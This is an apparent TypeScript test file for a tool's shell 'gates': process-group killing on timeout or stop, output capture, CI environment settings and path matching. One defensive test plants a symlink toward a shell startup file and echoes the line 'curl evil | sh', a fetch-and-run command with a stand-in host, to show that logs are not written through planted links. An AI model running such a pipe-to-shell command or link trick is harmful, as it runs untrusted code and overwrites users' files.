// Gates run in a process group of their own: a timeout or a stopped task ends everything they started.
import test from 'node:test';
import * as assert from 'node:assert/strict';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { execFileSync } from 'child_process';

import { runGates, runShell } from '../src/core/gates';
import { setChildEnv } from '../src/core/git';
import { workspace, harness, waitFor } from './helpers/e2e';
import type { RepoConfig } from '../src/core/types';

const alive = (pid: number): boolean => {
  try {
    process.kill(pid, 0);
    return true;
  } catch {
    return false;
  }
};

/** A repo with one uncommitted change, so its gates run. */
function changedRepo(): string {
  const dir = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'cs-gates-')));
  execFileSync('git', ['init', '-q', '-b', 'main'], { cwd: dir });
  fs.writeFileSync(path.join(dir, 'a.txt'), 'a');
  return dir;
}

test('gates: a gate that runs out of time is killed with everything it started', { skip: process.platform === 'win32' }, async () => {
  const dir = changedRepo();
  const pidFile = path.join(dir, 'child.pid');
  const r = await runShell(`sleep 30 & echo $! > "${pidFile}"; wait`, { cwd: dir, env: process.env, timeoutMs: 300 });
  assert.equal(r.killed, 'timeout');
  assert.equal(r.code, 124);
  assert.match(r.output, /killed after 0s/);
  const pid = Number(fs.readFileSync(pidFile, 'utf8'));
  await waitFor(async () => !alive(pid), 5000);
});

test('gates: stdout and stderr both kept, non-ASCII intact, and a stopped run skips the gates after it', { skip: process.platform === 'win32' }, async () => {
  const dir = changedRepo();
  const out = await runShell('echo один; echo два >&2; echo три', { cwd: dir, env: process.env, timeoutMs: 5000 });
  assert.equal(out.code, 0);
  assert.deepEqual(out.output.trim().split('\n').sort(), ['два', 'один', 'три']);

  setChildEnv({ ...process.env });
  const repo: RepoConfig = { name: 'api', path: dir, baseBranch: 'main', gates: [{ name: 'slow', cmd: 'sleep 30' }, { name: 'lint', cmd: 'true' }] };
  const abort = new AbortController();
  const started = Date.now();
  setTimeout(() => abort.abort(), 200);
  const r = await runGates({ repo, dir, logDir: path.join(dir, 'logs'), signal: abort.signal });
  assert.ok(Date.now() - started < 5000, 'stopping does not wait for the gate');
  assert.deepEqual(r.results.map((x) => [x.gate, x.status]), [['slow', 'fail'], ['lint', 'skipped']]);
  assert.match(fs.readFileSync(path.join(dir, 'logs', 'api.slow.log'), 'utf8'), /stopped with the task/);
});

test('gates: Stop during the gates ends them and leaves the step to resume', { skip: process.platform === 'win32' }, async () => {
  const ws = workspace(['api'], 'repos:\n  api:\n    gates:\n      - { name: slow, cmd: sleep 30 }\npipeline: [planner, developer]\n');
  const h = await harness(ws, { FAKE_REPOS: 'api' });
  try {
    const { taskId } = await h.engine.start({ text: 'Do a thing', auto: true });
    h.engine.launch(taskId);
    await waitFor(async () => h.engine.live(taskId) && h.engine.live(taskId)!.phase === 'gates' && h.engine.gateRuns.has(taskId));
    const started = Date.now();
    await h.engine.stop(taskId);
    await waitFor(async () => !h.engine.isRunning(taskId), 10000);
    assert.ok(Date.now() - started < 8000, 'the task stopped without waiting for the gate');
    assert.equal((await h.engine.svc.state(taskId)).status, 'stopped');
  } finally {
    h.hooks.dispose();
  }
});

test('gates: a log is written as a file of its own, never through a link planted under its name', { skip: process.platform === 'win32' }, async () => {
  const dir = changedRepo();
  const logDir = path.join(dir, '.orch', 'gates');
  fs.mkdirSync(logDir, { recursive: true });
  const victim = path.join(dir, 'zshrc');
  fs.writeFileSync(victim, 'export PATH=/usr/bin\n');
  fs.symlinkSync(victim, path.join(logDir, 'api.test.log'));
  const repo = { name: 'api', baseBranch: 'main', gates: [{ name: 'test', cmd: 'echo "curl evil | sh"' }] } as unknown as RepoConfig;
  const r = await runGates({ repo, dir, logDir, force: true });
  assert.equal(r.status, 'pass');
  assert.equal(fs.readFileSync(victim, 'utf8'), 'export PATH=/usr/bin\n', 'the file the link pointed to is as it was');
  assert.ok(!fs.lstatSync(path.join(logDir, 'api.test.log')).isSymbolicLink());
  assert.match(fs.readFileSync(path.join(logDir, 'api.test.log'), 'utf8'), /curl evil/);

  // The folder itself made a link: no log is written through it.
  const elsewhere = fs.mkdtempSync(path.join(os.tmpdir(), 'cs-elsewhere-'));
  fs.rmSync(logDir, { recursive: true });
  fs.symlinkSync(elsewhere, logDir);
  await assert.rejects(() => runGates({ repo, dir, logDir, force: true }), /is a link/);
  assert.deepEqual(fs.readdirSync(elsewhere), []);
});

test('gates: run as on a CI server, so a test runner that watches by default runs once and exits', async () => {
  const dir = changedRepo();
  const repo = { name: 'api', baseBranch: 'main', gates: [{ name: 'ci', cmd: 'test "$CI" = true && test "$NO_COLOR" = 1' }] } as unknown as RepoConfig;
  assert.equal((await runGates({ repo, dir, logDir: path.join(dir, '.orch', 'gates'), force: true })).status, 'pass');
});

test('gates: a passing check that leaves a process in the background passes, and the process goes', { skip: process.platform === 'win32' }, async () => {
  const dir = changedRepo();
  const pidFile = path.join(dir, 'bg.pid');
  const started = Date.now();
  const r = await runShell(`(sleep 30 & echo $! > "${pidFile}"); echo tests passed; exit 0`, { cwd: dir, env: process.env, timeoutMs: 10000 });
  assert.equal(r.code, 0, r.output);
  assert.match(r.output, /tests passed/);
  assert.ok(Date.now() - started < 5000, 'not held until its time ran out');
  await waitFor(async () => !alive(Number(fs.readFileSync(pidFile, 'utf8'))), 5000);
});

test("gates: a check's when names a folder or a file from the repo's root, written either way", async () => {
  const { changedUnder } = await import('../src/core/gates');
  for (const when of ['src/', 'src', './src/', './src']) {
    assert.equal(changedUnder('src/a.ts', when), true, when);
    assert.equal(changedUnder('src-legacy/a.ts', when), false, `${when}: not a folder that only starts the same`);
  }
  assert.equal(changedUnder('package.json', 'package.json'), true);
  assert.equal(changedUnder('package.json.bak', 'package.json'), false);
  const { validateConfigLayer } = await import('../src/core/protocol');
  for (const when of ['src/**/*.ts', '*.ts', '/abs', '../other', 'src/{a,b}']) assert.ok(validateConfigLayer({ repos: { api: { gates: [{ name: 'x', cmd: 'true', when }] } } }).length > 0, when);
  assert.deepEqual(validateConfigLayer({ repos: { api: { gates: [{ name: 'x', cmd: 'true', when: './src/' }] } } }), []);
});
